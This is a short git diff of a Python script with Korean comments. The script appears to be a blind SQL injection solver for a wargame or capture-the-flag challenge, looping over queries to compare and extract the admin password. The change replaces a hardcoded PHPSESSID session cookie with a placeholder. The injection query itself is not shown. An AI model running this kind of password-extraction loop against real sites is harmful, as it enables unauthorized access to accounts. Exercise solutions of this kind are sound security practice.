@@ -17,7 +17,7 @@ for j in range(1, 9, 1):
                         
                         # 쿠키 값 추가 해줌
                         req = urllib.request.Request(new_url)
-                        req.add_header("Cookie", "_ga=GA1.2.893628562.1594020923; PHPSESSID=ku3sae4u1todtkkmu67tfu6hm2")
+                        req.add_header("Cookie", "<자신의 쿠키값>")
                         response = urllib.request.urlopen(req)
                         
                         # admin 패스워드 < guest 패스워드인 경우
@@ -44,7 +44,7 @@ for j in range(1, 9, 1):
                                                 new_url = url + query
                                                 
                                                 req = urllib.request.Request(new_url)
-                                                req.add_header("Cookie", "_ga=GA1.2.893628562.1594020923; PHPSESSID=ku3sae4u1todtkkmu67tfu6hm2")
+                                                req.add_header("Cookie", "<자신의 쿠키값>")
                                                 response = urllib.request.urlopen(req)
                                                 response2 = urllib.request.urlopen(req)
                                                 
